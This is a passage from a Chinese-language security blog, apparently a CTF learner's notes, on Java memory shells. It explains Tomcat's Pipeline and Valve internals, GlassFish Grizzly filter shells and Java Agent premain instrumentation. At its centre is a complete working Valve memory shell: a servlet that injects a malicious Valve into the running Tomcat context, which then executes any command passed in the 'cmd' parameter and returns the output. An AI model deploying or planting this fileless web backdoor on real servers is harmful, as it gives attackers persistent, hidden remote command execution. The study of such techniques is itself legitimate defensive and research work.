<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Pipeline</span> <span class="keyword">extends</span> <span class="title class_">Contained</span> &#123;</span><br><span class="line">    Valve <span class="title function_">getBasic</span><span class="params">()</span>; <span class="comment">//获取基础阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setBasic</span><span class="params">(Valve var1)</span>; <span class="comment">//设置基础阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve var1)</span>; <span class="comment">//添加阀门</span></span><br><span class="line"></span><br><span class="line">    Valve[] getValves(); <span class="comment">//获取阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">removeValve</span><span class="params">(Valve var1)</span>; <span class="comment">//移除阀门</span></span><br><span class="line"></span><br><span class="line">    Valve <span class="title function_">getFirst</span><span class="params">()</span>; <span class="comment">//获取首个阀门</span></span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>; <span class="comment">//是否支持异步</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">findNonAsyncValves</span><span class="params">(Set&lt;String&gt; var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看出<code>Pipeline</code>中很多的方法都是操作<code>Valve</code>的，包括获取，设置，移除<code>Valve</code>,<code>getFirst()</code>返回的是<code>Pipeline</code>上的第一个<code>Valve</code>,而<code>getBasic()</code>,<code>setBasic()</code>则是获取&#x2F;设置基础阀,我们都知道在<code>Pipeline</code>中，每个<code>pipeline</code>至少都有一个阀门，叫做基础阀，而<code>getBasic()</code>,<code>setBasic()</code>则是操作基础阀的。</p>
<p><strong>Tomcat 中 Pipeline 仅有一个实现 StandardPipeline，存放在 ContainerBase 的 pipeline 属性中，并且 ContainerBase 提供 <code>addValve</code> 方法调用 StandardPipeline 的 addValve 方法添加。</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve valve)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Validate that we can add this Valve</span></span><br><span class="line">	<span class="comment">// 验证Valve 关联Container</span></span><br><span class="line">    <span class="keyword">if</span> (valve <span class="keyword">instanceof</span> Contained)</span><br><span class="line">        ((Contained) valve).setContainer(<span class="built_in">this</span>.container);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start the new component if necessary</span></span><br><span class="line">	<span class="comment">// 验证组件状态，如果对的话 启动需要添加的Valve，调用start方法。</span></span><br><span class="line">    <span class="keyword">if</span> (getState().isAvailable()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (valve <span class="keyword">instanceof</span> Lifecycle) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ((Lifecycle) valve).start();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;StandardPipeline.addValve: start: &quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//如果 first变量为空，将valve赋值给first变量，并且设置 valve的下一个阀门为基础阀</span></span><br><span class="line">	<span class="comment">//之所以这样是因为，如果first为空说明这个容器只有一个基础阀，所以此次添加的阀门肯定是第一个非基础阀阀门</span></span><br><span class="line">    <span class="comment">// Add this Valve to the set associated with this Pipeline</span></span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">null</span>) &#123;</span><br><span class="line">        first = valve;</span><br><span class="line">        valve.setNext(basic);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//否则 遍历阀门链表，将要被添加的阀门设置在基础阀之前。</span></span><br><span class="line">        <span class="type">Valve</span> <span class="variable">current</span> <span class="operator">=</span> first;</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (current.getNext() == basic) &#123;</span><br><span class="line">                current.setNext(valve);</span><br><span class="line">                valve.setNext(basic);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            current = current.getNext();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//container触发添加阀门事件</span></span><br><span class="line">    container.fireContainerEvent(Container.ADD_VALVE_EVENT, valve);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>Tomcat 中四个层级的容器都继承了 ContainerBase ，所以在哪个层级的容器的标准实现上添加自定义的 Valve 均可。</p>
<p>添加后，将会在 <code>org.apache.catalina.connector.CoyoteAdapter</code> 的 <code>service</code> 方法中调用 Valve 的 <code>invoke</code> 方法。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1623648233517.png"
                      alt="img"
                ></p>
<p>只要自己写一个 Valve 的实现类，为了方便也可以直接使用 ValveBase 实现类。里面的 <code>invoke</code> 方法加入我们的恶意代码，由于可以拿到 Request 和 Response 方法，所以也可以做一些参数上的处理或者回显。然后使用 StandardContext 中的 pipeline 属性的 addValve 方法进行注册。</p>
<h3 id="valve内存马编写路程"><a href="#valve内存马编写路程" class="headerlink" title="valve内存马编写路程"></a>valve内存马编写路程</h3><p><a class="link"   href="https://drun1baby.github.io/2022/09/07/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#toc-heading-3" >Java内存马系列-06-Tomcat 之 Valve 型内存马 | 芜风 (drun1baby.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>我们无法直接获取到 <code>StandardPipeline</code> ，需要先获取 <code>StandardContext</code>才能拿到</p>
<p>所以这里我们可以得到的攻击思路如下：</p>
<ul>
<li><p>先获取 <code>StandardContext</code></p>
</li>
<li><p>编写恶意 Valve</p>
</li>
<li><p>通过 <code>StandardContext.getPipeline().addValve()</code> 添加恶意 Valve</p>
</li>
<li><p>Valve 是应该放到 Servlet 里面，因为在 Servlet 内存马中的 <code>HTTP11Processor</code> 的加载 HTTP 请求当中，是出现了 Pipeline 的 basic 的。所以我们通过 Servlet 来加载。</p>
</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Valve;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/testk&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiValve</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">            standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">ValveShell</span>());</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;Evil Valve inject success!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ValveShell</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdParamName</span> <span class="operator">=</span><span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(cmdParamName);</span><br><span class="line">                <span class="keyword">if</span>(cmd!=<span class="literal">null</span>) &#123;</span><br><span class="line">                    String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    java.io.<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                    response.getWriter().write(<span class="string">&quot;smail evil valve isComing!!!\n&quot;</span>);</span><br><span class="line">                    writer.write(output);</span><br><span class="line">                    writer.flush();</span><br><span class="line">                    writer.close();</span><br><span class="line">                    <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="九、GlassFish-Grizzly-Filter-内存马"><a href="#九、GlassFish-Grizzly-Filter-内存马" class="headerlink" title="九、GlassFish Grizzly Filter 内存马"></a>九、GlassFish Grizzly Filter 内存马</h2><p>（这个组件的内存马，网上资料相当少啊。。）</p>
<p>需要去下一个glassfish来做容器，我一直以为是maven添加依赖。。。找了我好几个小时。。我装的5.0版本的</p>
<p><a class="link"   href="https://blog.csdn.net/as403045314/article/details/101337299" >(55条消息) Glassfish安装、基本使用、在idea中配置Glassfish_as403045314的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>（这文章里面不用全看，就当个下载链接即可，glassfish和tomcat配置方法差不多,我本地跑glassfish会报错，鼓捣了半天，还是报错，先不搞这个了，以后比赛出现 GlassFish 容器再说，我把内存马记一下）</p>
<p>GlassFish 使用 grizzly 组件来完成 NIO 的工作，类似 Tomcat 中的 connector 组件。在 HTTP 下，grizzly 负责解析和序列化 HTTP 请求&#x2F;响应，grizzly 有职责链设计模式的体现，类似Tomcat的Pipeline和Valve，提供了 Filter 和 FilterChain 等接口及实现，就可以被用来写入内存马。</p>
<p>可以采用是通过 <code>HttpServletRequest</code> 最终获取<code>grizzlyRequest</code>，调用其 <code>addAfterServiceListener</code></p>
<p>在 <code>AfterServiceListener</code> 的 <code>onAfterService</code> 中拿到 <code>filterChain</code> 并添加恶意Filter：</p>
<p><a class="link"   href="https://github.com/su18/MemoryShell/commit/38ffaf43782176c47044f588164923c3c5a36b8b#diff-4566c0d4919a1fdefc28876fd5ec7c3a00bd3e86c83526f06085284f82246763" >GlassFish Filter <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/su18/MemoryShell/commit/38ffaf43782176c47044f588164923c3c5a36b8b#diff-dd129e104398383810d8bb6b2ae114d349893a803c35baeee0e4c05450b50a17" >GlassFish ServiceList <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="十、Java-Agent-内存马"><a href="#十、Java-Agent-内存马" class="headerlink" title="十、Java Agent 内存马"></a>十、Java Agent 内存马</h2><p><a class="link"   href="http://wjlshare.com/archives/1582" >浅谈 Java Agent 内存马 – 天下大木头 (wjlshare.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Java Agent 支持两种方式进行加载：</p>
<blockquote>
<p>实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）</p>
<p>实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有），主要结合 ClassFileTransformer 接口</p>
</blockquote>
<h3 id="1、java-agent两个加载方式介绍"><a href="#1、java-agent两个加载方式介绍" class="headerlink" title="1、java agent两个加载方式介绍"></a>1、java agent两个加载方式介绍</h3><p>本质是一个jar包中的类，有两种实现，第一种是通过permain()函数实现。这种javaagent会在宿主程序的main函数的启动前启动自己premain函数，这时候会得到一个Instrumentation对象，我们可以通过Instrumentation对象对还未加载的class进行拦截与修改。</p>
<p>还有一种实现方式是利用agentmain()函数。VirtualMachine类的attach(pid)方法可以将当前进程attach到一个运行中的java进程上，接着利用loadAgent(agentJarPath)来将含符合格式且含有agentmain函数的jar包注入到对应的进程，调用loadAgent函数后，对应的进程中会多出一个Instrumentation对象，这个对象会被当作agentmain的一个参数。<br>对应进程接着会调用agentmain函数，进而操作Instrumentation对象，Instrumentation对象可以在class加载前拦截字节码进行修改，也可以对已经加载的class重新让它加载，并拦截且修改其中的内容，跟进程注入差不多，具体做什么操作，取决于我们的jar文件中的agentmain函数怎么写。</p>
<p><strong>Instrumentation 的部分重要方法</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h3 id="2、几个重要的类："><a href="#2、几个重要的类：" class="headerlink" title="2、几个重要的类："></a>2、几个重要的类：</h3><p>Instrumentation对象实现对class的修改操作是依赖于ClassFileTransformer接口中的transform函数。</p>
<p>ClassFileTransformer 对象会被当作参数传给 Instrumentation.addTransformer 函数。此时 Instrumentation.addTransformer  函数其实执行的是其中 ClassFileTransformer 的transform函数。</p>
<h4 id="ClassFileTransformer-接口"><a href="#ClassFileTransformer-接口" class="headerlink" title="ClassFileTransformer 接口"></a><strong>ClassFileTransformer 接口</strong></h4><blockquote>
<p>ClassFileTransformer 接口为转换类文件的代理接口。提供了 <code>transform()</code> 方法用于修改原类的注入。<br>我们可以在获取到 Instrumentation 对象后通过 <code>addTransformer()</code> 方法添加自定义类文件转换器。</p>
</blockquote>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类文件转换方法，重写transform方法可获取到待加载的类相关信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader              定义要转换的类加载器；如果是引导加载器，则为 null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className           类名,如:java/lang/Runtime</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> protectionDomain    要定义或重定义的类的保护域</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回一个通过ASM修改后添加了防御代码的字节码byte数组。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">        <span class="type">byte</span>[] transform(  ClassLoader loader, </span><br><span class="line">                String className,</span><br><span class="line">                Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                ProtectionDomain protectionDomain,</span><br><span class="line">                <span class="type">byte</span>[] classfileBuffer)</span><br><span class="line">        <span class="keyword">throws</span> IllegalClassFormatException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>重写 <code>transform()</code> 方法需要注意以下事项：</strong></p>
<ol>
<li>ClassLoader 如果是被 Bootstrap ClassLoader (引导类加载器)所加载那么 loader 参数的值是空。</li>
<li>修改类字节码时需要特别注意插入的代码在对应的 ClassLoader 中可以正确的获取到，否则会报 ClassNotFoundException ，比如修改 java.io.FileInputStream (该类由 Bootstrap ClassLoader 加载)时插入了我们检测代码，那么我们将必须保证 FileInputStream 能够获取到我们的检测代码类。</li>
<li>JVM类名的书写方式路径方式：<code>java/lang/String</code> 而不是我们常用的类名方式：<code>java.lang.String</code>。</li>
<li>类字节必须符合 JVM 校验要求，如果无法验证类字节码会导致 JVM 崩溃或者 VerifyError (类验证错误)。</li>
<li>如果修改的是 retransform 类(修改已被 JVM 加载的类)，修改后的类字节码不得新增方法、修改方法参数、类成员变量。</li>
<li><code>addTransformer</code> 时如果没有传入 retransform 参数(默认是 false )，就算 MANIFEST.MF 中配置了 <code>Can-Redefine-Classes: true</code> 而且手动调用了<code>retransformClasses()</code>方法也一样无法retransform。</li>
<li>卸载 transform 时需要使用创建时的 Instrumentation 实例。</li>
</ol>
<p><strong>还需要理解的是，在以下三种情形下 <code>ClassFileTransformer.transform()</code> 会被执行：</strong></p>
<ol>
<li>新的 class 被加载。</li>
<li><code>Instrumentation.redefineClasses</code> 显式调用。</li>
<li><code>addTransformer</code> 第二个参数为 true 时，<code>Instrumentation.retransformClasses</code> 显式调用。</li>
</ol>
<h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">VirtualMachine</span> &#123;</span><br><span class="line">    <span class="comment">// 获得当前所有的JVM列表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;VirtualMachineDescriptor&gt; <span class="title function_">list</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据pid连接到JVM</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> VirtualMachine <span class="title function_">attach</span><span class="params">(String id)</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 断开连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">detach</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载agent，agentmain方法靠的就是这个方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">loadAgent</span><span class="params">(String agent)</span> &#123; ... &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><p>可以理解成加强版的Method对象。</p>
<p>获得方法：CtMethod m &#x3D; cc.getDeclaredMethod(MethodName)。</p>
<p>这个类提供了一些方法，使我们可以便捷的修改方法体：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类 CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h3 id="3、启动时加载-agent——premain"><a href="#3、启动时加载-agent——premain" class="headerlink" title="3、启动时加载 agent——premain"></a>3、启动时加载 agent——premain</h3><p><strong>——利用premain函数实现java agent</strong></p>
<p>Javaagent 是 java 命令的一个参数。参数 javaagent 可以用于指定一个 jar 包，并且对该 java 包有2个要求：</p>
<blockquote>
<ul>
<li>这个 jar 包的 MANIFEST.MF 文件必须指定 Premain-Class 项。</li>
<li>Premain-Class 指定的那个类必须实现 premain() 方法。</li>
</ul>
</blockquote>
<p>拦截到的class文件会被转化为字节码，然后传给premain函数，premain函数中可以调用Instrumentation类中的函数对刚刚传送进来的字节码进行操作。等到操作结束会将字节码给jvm加载。</p>
<blockquote>
<p>( premain 方法顾名思义，会在我们运行 main 方法之前进行调用，即在运行 main 方法之前会先去调用我们 jar 包中 Premain-Class 类中的 premain 方法)</p>
</blockquote>
<p>且 <code>premain</code> 函数格式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void premain(String agentArgs, Instrumentation inst)</span><br></pre></td></tr></table></figure></div>



<h4 id="小demo尝试"><a href="#小demo尝试" class="headerlink" title="小demo尝试"></a>小demo尝试</h4><p><strong>1.创建一个类，需要实现premain方法</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Java_Agent.premain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">premainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(agentArgs);</span><br><span class="line">        System.out.println(<span class="string">&quot;koishi 的 premaindemo 来喽&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>2.接下来创建 mainfest，这里将其保存为 agent.mf ，一定要含有 Premain-Class 属性</strong></p>
<p>（ps：注意这里的 mf 一定要有空行）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Premain-Class: premainDemo</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>**3.利用 javac 将 java 文件编译成 class 之后，利用 jar 命令打包，生成我们的 agent.jar **</p>
<p><strong><font color="red">(打class的时候 java 文件一定一定不要带上package信息，不然会出现找不到类的报错)</font></strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac .\premainDemo_Say.java</span><br><span class="line">jar cvfm agent.jar cirno.mf .\premainDemo_Say.class</span><br></pre></td></tr></table></figure></div>



<p><strong>4.然后创建一个普通类作为测试 demo</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Java_Agent.premain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiNice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>Ilyn.mf</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: KoishiNice</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>同样的利用 javac 编译之后打包成 Ilyn.jar</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac .\KoishiNice.java</span><br><span class="line">jar cvfm Ilyn.jar Ilyn.mf .\KoishiNice.class</span><br></pre></td></tr></table></figure></div>

<p>最终得到了 agent.jar 和  Ilyn.jar</p>
<p>接下来我们只需要在 <code>java -jar</code> 中添加 <code>-javaagent:agent.jar</code> 即可在启动时优先加载 agent , 而且可利用如下方式获取传入我们的 agentArgs 参数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -javaagent:agent.jar[=options] -jar Ilyn.jar</span><br></pre></td></tr></table></figure></div>

<p>测试看看</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -javaagent:agent.jar=&quot;Please be careful, because Koishi is looking at you&quot; -jar Ilyn.jar</span><br></pre></td></tr></table></figure></div>





<h4 id="动态修改字节码"><a href="#动态修改字节码" class="headerlink" title="动态修改字节码"></a>动态修改字节码</h4><p>在demo处，我们可以发现，在实现 premain 的时候，我们除了能获取到 agentArgs 参数，还可以获取 Instrumentation 实例，复习一下</p>
<p><strong><font color="brown">Instrumentation</font></strong></p>
<p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果</p>
